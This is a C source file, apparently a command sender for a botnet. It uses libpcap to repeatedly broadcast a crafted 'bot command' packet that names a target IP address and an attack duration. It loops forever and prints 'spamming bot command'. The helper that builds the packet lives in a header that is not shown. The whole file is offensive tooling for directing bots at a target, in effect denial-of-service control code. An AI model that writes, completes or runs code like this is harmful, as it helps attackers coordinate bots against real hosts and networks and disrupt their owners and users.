#include <stdio.h>
#include <pcap/pcap.h>
#include "utils.h"
#include <unistd.h>
#include <string.h>

extern char errbuff[PCAP_ERRBUF_SIZE];
#define NPCAP_ERROR printf("NPCAP error message: \"%s\"\n", errbuff);

extern const char* adapter_id;

int main(int argc, char* argv[])
{
    // op1 - target_ip
    // op2 - attack time
    // op3 - timeout

    u_char ip[4] = {192, 168, 1, 13};
    int attack_time = 20;
    int timeout = 10;

    if(argc < 3)
    {
        printf("Error. You must specify target_ip, time and optionally timeout");
        return 1;
    }
    else
    {
        // int len_ip = strlen(argv[1]);
        // char* tmp = malloc((len_ip+2));
        // memcpy(tmp, argv[1], len_ip);
        // tmp[len_ip] = '.';
        // tmp[len_ip+1] = 0;

        // printf("tmp: %s\n", tmp);

        ip[0] = atoi(strtok(argv[1], "."));
        for(int i=1; i<4; i++)
        {
            ip[i] = atoi(strtok(NULL, "."));
        }    

        //ip[3] = atoi(strchr(argv[1], '.'));
        //free(tmp);

        attack_time = atoi(argv[2]);

        if(argv[3])
            timeout = atoi(argv[3]);
    }

    printf("spamming bot command on ip: ");
    for(int i=0; i<3; i++)
        printf("%d.", ip[i]);
    printf("%d ", ip[3]);
    printf("for %d seconds every %d seconds\n\n", attack_time, timeout);

    pcap_t* handler = pcap_open_live(adapter_id, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, errbuff);

    if(!handler)
    {
        NPCAP_ERROR
        return 1;
    }
    
    u_char package[64];
    
    create_bot_command(ip, attack_time, package);

    while(true)
    {
        pcap_sendpacket(handler, package, 64);
        printf("sending command:\n");
        for(int i=0; i<64; i++)
            printf("%x ", package[i]);
        printf("\n\n");
        sleep(timeout);
    }

    return 0;
}